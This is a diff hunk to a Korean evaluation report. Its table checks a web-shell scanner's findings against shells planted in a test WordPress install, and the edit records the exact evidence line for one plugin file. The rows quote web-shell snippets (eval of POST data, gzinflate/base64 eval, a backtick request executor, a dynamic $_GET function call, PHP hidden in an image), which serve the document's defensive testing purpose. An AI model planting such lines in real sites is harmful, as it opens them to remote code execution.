@@ -80,7 +80,7 @@ WordPress 구조에 심은 웹쉘 3개(업로드 폴더 `s.php`, 업로드 폴�
 | --- | --- | --- |
 | `wp-content/uploads/2026/11/cache.php` (`@eval($_POST[..])`) | 심각 (요청 값 → 실행; 업로드 폴더) | 일치 |
 | `wp-content/uploads/2026/11/avatar.jpg` (GIF 헤더 + PHP) | 심각 (이미지 속 PHP) | 일치 |
-| `wp-content/plugins/hello-x/hello-x.php` (백틱 실행) | 심각, 근거 5행 | 탐지 (출력 앞부분이 잘려 근거 줄은 미확인) |
+| `wp-content/plugins/hello-x/hello-x.php` (백틱 실행) | 심각, 근거 5행 | 일치, 근거 5행 `` echo `{$_REQUEST["k"]}`; `` |
 | `wp-includes/class-wp-cache-helper.php` (`eval(gzinflate(base64_decode(..)))`) | 심각 (인코딩 풀어 실행) | 일치 |
 | `wp-content/themes/twentytwentyfive/functions.php` 끝에 `$_GET["f"]($_GET["c"]);` | 심각 | 일치, 근거 160행 (정상 코드 159줄 뒤에 끼운 한 줄을 찾음) |
 | `wp-content/uploads/2026/11/info.php` (`phpinfo()`) | 위험 (업로드 폴더 안 스크립트) | 일치 |
